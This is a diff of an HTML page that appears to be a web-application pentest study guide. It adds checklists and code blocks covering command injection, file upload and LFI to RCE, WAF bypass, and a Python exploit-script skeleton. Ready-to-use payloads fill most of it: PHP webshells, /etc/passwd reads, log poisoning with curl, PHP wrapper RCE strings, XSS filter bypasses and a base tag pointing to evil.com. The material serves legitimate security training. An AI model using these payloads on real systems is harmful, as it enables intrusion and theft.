+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-1-1"> Code evaluation: <code>eval()</code>, <code>exec()</code>, <code>compile()</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-2"> Node.js command execution sinks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-2-0"> <code>child_process.exec()</code>, <code>child_process.execSync()</code>, <code>child_process.spawn()</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-2-1"> Code evaluation: <code>eval()</code>, <code>Function()</code>, <code>vm.runInNewContext()</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-3"> Test basic injection operators:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-3-0"> Separator: <code>; id</code>, <code>| id</code>, <code>|| id</code>, <code>& id</code>, <code>&& id</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-3-1"> Newline: <code>%0a id</code>, <code>%0d%0a id</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-3-2"> Backtick: <code>`id`</code>, <code>$(id)</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-cmdinj-filter-bypass">15.10.2 Filter Bypass Techniques</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-0"> PHP-specific evasion:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-0-0"> String concatenation: <code>"sys"."tem"</code> passes to <code>call_user_func()</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-0-1"> Reverse: <code>strrev("metsys")</code> &rarr; <code>system</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-0-2"> Base64: <code>base64_decode("c3lzdGVt")</code> &rarr; <code>system</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-0-3"> Variable variables: <code>$a="sys"; $b="tem"; $c=$a.$b; $c("id")</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-1"> Whitespace bypass:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-1-0"> <code>$IFS</code> as space substitute in bash: <code>cat$IFS/etc/passwd</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-1-1"> Tab: <code>%09</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-1-2"> Brace expansion: <code>{{cat,/etc/passwd}}</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-2"> Character blacklist bypass:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-2-0"> Wildcard: <code>/???/??t /???/p??s?d</code> = <code>cat /etc/passwd</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-filter-bypass-wf-2-1"> Hex in bash: <code>$'\\x63\\x61\\x74'</code> = <code>cat</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PHP filter bypass techniques
+"sys"."tem"                # string concatenation → call_user_func("system","id")
+strrev("metsys")           # reverse → system
+base64_decode("c3lzdGVt")  # base64 decode → system
+$a="sys"; $b="tem"; $c=$a.$b; $c("id")   # variable variables
+
+# Whitespace bypass
+cat$IFS/etc/passwd         # $IFS as space
+{cat,/etc/passwd}          # brace expansion
+
+# Character blacklist bypass
+/???/??t /???/p??s?d       # wildcards → cat /etc/passwd
+$'\x63\x61\x74'            # hex in bash → cat</code></pre>
+
+<h4 id="methodology-cmdinj-php-bypasses">15.10.3 PHP-Specific Bypasses</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-0"> Bypass disable_functions via mail():
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-0-0"> <code>mail("", "", "", "", "-X/var/www/html/shell.php")</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-0-1"> The <code>-X</code> flag writes the mail log to the specified file &mdash; inject PHP code in the body</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-1"> .htaccess injection for execution:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-1-0"> <code>AddType application/x-httpd-php .jpg</code> &mdash; makes .jpg files execute as PHP</li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-1-1"> Upload the .htaccess via file upload or other write primitive</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-2"> PHP eval filter bypass (Dolibarr-style):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-2-0"> When <code>eval()</code> filters function names but allows expressions</li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-2-1"> Use variable functions: <code>$f="system"; $f("id")</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-php-bypasses-wf-2-2"> Use <code>call_user_func()</code>: <code>call_user_func("system", "id")</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Command Injection</a> &middot; <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer">OWASP Top 10</a></p>
+
+<h3 id="methodology-upload-lfi">15.11 File Upload &amp; LFI to RCE</h3>
+<p>Upload a webshell or chain a local file inclusion to achieve code execution.</p>
+<h4 id="methodology-upload-lfi-upload-bypass">15.11.1 Upload Bypass</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-0"> Extension bypass techniques:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-0-0"> Alternative extensions: <code>.php5</code>, <code>.phtml</code>, <code>.pht</code>, <code>.phps</code>, <code>.phar</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-0-1"> Null byte (legacy): <code>shell.php%00.jpg</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-0-2"> Double extension: <code>shell.php.jpg</code>, <code>shell.jpg.php</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-0-3"> Case variation: <code>.pHp</code>, <code>.PhP</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-1"> MIME type bypass:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-1-0"> Change <code>Content-Type</code> to <code>image/jpeg</code> or <code>image/png</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-1-1"> Intercept with Burp and modify after the browser sets it</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-2"> Magic bytes injection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-2-0"> <code>GIF89a;&lt;?php system($_GET['c']);?&gt;</code> &mdash; passes magic-byte and file-type checks</li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-2-1"> Prepend PNG/JPEG header bytes for binary checks</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-3"> .htaccess injection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-3-0"> Upload <code>.htaccess</code> containing <code>AddType application/x-httpd-php .xxx</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-upload-bypass-wf-3-1"> Then upload <code>shell.xxx</code> &mdash; Apache executes it as PHP</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-upload-lfi-lfi-rce">15.11.2 LFI Exploitation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-0"> Basic path traversal:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-0-0"> <code>../../../../etc/passwd</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-0-1"> Stripping bypass: <code>....//....//etc/passwd</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-0-2"> URL-encoded: <code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-0-3"> Double-encoded: <code>%252e%252e%252f</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Magic bytes webshell — passes GIF89a magic byte check
+GIF89a;&lt;?php system($_GET['c']);?&gt;
+
+# .htaccess injection — make arbitrary extensions execute as PHP
+AddType application/x-httpd-php .xxx
+
+# Log poisoning — inject PHP via User-Agent, then include the log
+curl -A "&lt;?php system(\$_GET['c']);?&gt;" http://target/
+# Then LFI: ../../../../var/log/apache2/access.log&amp;c=id</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-1"> PHP wrappers for code execution:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-1-0"> Source read: <code>php://filter/read=convert.base64-encode/resource=config.php</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-1-1"> Input stream: <code>php://input</code> with PHP code in POST body</li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-1-2"> Data wrapper: <code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-1-3"> Expect (if enabled): <code>expect://id</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-2"> Log poisoning:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-2-0"> Inject PHP via User-Agent: <code>curl -A "&lt;?php system(\$_GET['c']);?&gt;" http://target/</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-2-1"> Include the access log: <code>../../../../var/log/apache2/access.log</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-2-2"> Also check: <code>/var/log/nginx/access.log</code>, <code>/var/log/mail.log</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PHP wrappers for LFI → RCE
+php://filter/read=convert.base64-encode/resource=config.php   # source read
+php://input                          # POST body as PHP (send &lt;?php system('id');?&gt;)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   # inline PHP
+expect://id                          # direct RCE (if expect ext loaded)</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-3"> Session file poisoning:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-3-0"> Write PHP code into session data via a controllable session variable</li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-3-1"> Include session file: <code>../../../../tmp/sess_PHPSESSID</code></li>
+        <li><input type="checkbox" data-id="methodology-upload-lfi-lfi-rce-wf-3-2"> Or: <code>/var/lib/php/sessions/sess_PHPSESSID</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Upload</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings LFI</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-waf-bypass">15.12 WAF Bypass</h3>
+<p>When a WAF blocks your payloads, use encoding tricks, alternate syntax, and protocol-level bypasses.</p>
+<h4 id="methodology-waf-bypass-sqli-waf">15.12.1 SQLi WAF Bypass</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-0"> Case and comment tricks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-0-0"> Case variation: <code>SeLeCt</code>, <code>uNiOn</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-0-1"> Inline comments: <code>SE/**/LECT</code>, <code>UN/**/ION</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-0-2"> MySQL version comments: <code>SELECT/*!32302 1*/</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-1"> Whitespace alternatives:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-1-0"> Tab: <code>%09</code>, newline: <code>%0a</code>, carriage return: <code>%0d</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-1-1"> Parentheses as separators: <code>SELECT(username)FROM(users)</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-2"> Encoding bypasses:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-2-0"> Double encoding: <code>%2527</code> decodes to <code>%27</code> then <code>'</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-2-1"> Unicode: <code>%u0027</code> for single quote</li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-sqli-waf-wf-2-2"> Hex: <code>0x61646d696e</code> for string <code>admin</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-waf-bypass-xss-waf">15.12.2 XSS WAF Bypass</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-0"> Alternate event handlers:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-0-0"> <code>&lt;svg/onload=alert(1)&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-0-1"> <code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-0-2"> <code>&lt;marquee onstart=alert(1)&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-0-3"> <code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-1"> Encoding-based bypass:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-1-0"> HTML entities: <code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-1-1"> JavaScript hex escapes: <code>\\x3cscript\\x3ealert(1)\\x3c/script\\x3e</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-1-2"> Template literals: <code>${{alert`1`}}</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-2"> CSP bypass techniques:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-2-0"> Find a whitelisted CDN that hosts <code>angular.js</code> and use <code>ng-app</code> + <code>ng-csp</code></li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-2-1"> JSONP callback injection on whitelisted domains</li>
+        <li><input type="checkbox" data-id="methodology-waf-bypass-xss-waf-wf-2-2"> Base-tag injection: <code>&lt;base href="http://evil.com/"&gt;</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SQLi</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings XSS</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-exploit-scripting">15.13 Exploit Scripting</h3>
+<p>Chain all findings into a single Python exploit script that achieves the objective end-to-end.</p>
+<h4 id="methodology-exploit-scripting-skeleton">15.13.1 Python Exploit Skeleton</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-0"> Set up the script structure:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-0-0"> <code>import requests, sys, re, urllib3</code></li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-0-1"> <code>urllib3.disable_warnings()</code></li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-0-2"> <code>s = requests.Session()</code></li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-0-3"> <code>s.verify = False</code></li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-0-4"> <code>s.proxies = {{"http": "http://127.0.0.1:8080"}}</code> for Burp interception during dev</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-1"> One function per exploit stage:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-1-0"> Stage 1: <code>authenticate()</code> &mdash; get a session or bypass auth</li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-1-1"> Stage 2: <code>exploit()</code> &mdash; trigger the vulnerability</li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-1-2"> Stage 3: <code>post_exploit()</code> &mdash; extract data or get shell</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-2"> Argument handling at the top:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-2-0"> <code>if len(sys.argv) != 3: print(f"Usage: {{sys.argv[0]}} &lt;target&gt; &lt;lhost&gt;"); sys.exit(1)</code></li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-2-1"> <code>TARGET = sys.argv[1]</code></li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-2-2"> <code>LHOST = sys.argv[2]</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-3"> Main execution flow:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-3-0"> <code>if __name__ == "__main__":</code></li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-3-1"> Call each stage function in order</li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-3-2"> Print status messages for each stage</li>
+        <li><input type="checkbox" data-id="methodology-exploit-scripting-skeleton-wf-3-3"> Handle errors gracefully with <code>try/except</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import requests, sys, re, urllib3
+urllib3.disable_warnings()
+
+if len(sys.argv) != 3:
+    print(f"Usage: {sys.argv[0]} &lt;target&gt; &lt;lhost&gt;")
+    sys.exit(1)
+
+TARGET = sys.argv[1]
+LHOST  = sys.argv[2]
+s = requests.Session()
+s.verify = False
+s.proxies = {"http": "http://127.0.0.1:8080"}   # Burp
+
+def authenticate():
+    print("[*] Stage 1 — Authenticating...")
+    r = s.post(f"{TARGET}/login", data={"user":"admin","pass":"password"})
+    assert "dashboard" in r.text, "[-] Auth failed"
+    print("[+] Authenticated")
+
+def exploit():
+    print("[*] Stage 2 — Triggering vulnerability...")
+    payload = "PAYLOAD_HERE"
+    r = s.get(f"{TARGET}/vuln?param={payload}")
+    print(f"[+] Exploit sent — status {r.status_code}")
+
+def post_exploit():
+    print("[*] Stage 3 — Post-exploitation...")
+    r = s.get(f"{TARGET}/flag.txt")
+    print(f"[+] Flag: {r.text.strip()}")
+
+if __name__ == "__main__":
+    try:
+        authenticate()
+        exploit()
+        post_exploit()
+    except Exception as e:
+        print(f"[-] Failed: {e}")
+        sys.exit(1)</code></pre>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a> &middot; <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener noreferrer">OWASP Cheat Sheet Series</a></p>
+<h2 id="references">16. References</h2>
               <p>[1] PortSwigger, &quot;Web Security Academy (SQLi, XSS, SSTI, Deserialization, SSRF, XXE, CORS),&quot; [Online]. Available: <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">https://portswigger.net/web-security</a>.</p>
               <p>[2] OWASP, &quot;Testing Guide v4 &mdash; Web Application Security Testing,&quot; [Online]. Available: <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener noreferrer">https://owasp.org/www-project-web-security-testing-guide/</a>.</p>
               <p>[3] HackTricks, &quot;Web Pentesting Methodology,&quot; [Online]. Available: <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/" target="_blank" rel="noopener noreferrer">book.hacktricks.wiki &mdash; Web</a>.</p>
@@ -1381,15 +2643,19 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#methodology-preexam">15.1 Pre-Exam Setup</a>
-        <a href="#methodology-environment-recon">15.2 Environment &amp; App Recon</a>
-        <a href="#methodology-source-review">15.3 Source Review</a>
-        <a href="#methodology-auth-bypass">15.4 Authentication Bypass</a>
-        <a href="#methodology-escalate-rce">15.5 Escalate to RCE</a>
-        <a href="#methodology-debug-confirm">15.6 Debugger Confirmation</a>
-        <a href="#methodology-weaponize">15.7 Weaponise the Script</a>
-        <a href="#methodology-privesc">15.8 Post-Exploitation</a>
-        <a href="#methodology-reliability">15.9 Reliability &amp; Documentation</a>
+        <a href="#methodology-source-review">15.1 Source Code Review</a>
+        <a href="#methodology-auth-bypass">15.2 Authentication Bypass</a>
+        <a href="#methodology-sqli-rce">15.3 SQL Injection to RCE</a>
+        <a href="#methodology-xss">15.4 XSS to Account Takeover</a>
+        <a href="#methodology-ssti">15.5 Server-Side Template Injection</a>
+        <a href="#methodology-xxe">15.6 XML External Entity Injection</a>
+        <a href="#methodology-deserialization">15.7 Insecure Deserialization</a>
+        <a href="#methodology-ssrf">15.8 Server-Side Request Forgery</a>
+        <a href="#methodology-proto-pollution">15.9 Prototype Pollution (Node.js)</a>
+        <a href="#methodology-cmdinj">15.10 Command Injection &amp; Code Execution</a>
+        <a href="#methodology-upload-lfi">15.11 File Upload &amp; LFI to RCE</a>
+        <a href="#methodology-waf-bypass">15.12 WAF Bypass</a>
+        <a href="#methodology-exploit-scripting">15.13 Exploit Scripting</a>
       </div>
     </div>
     <div class="section-flow-16">
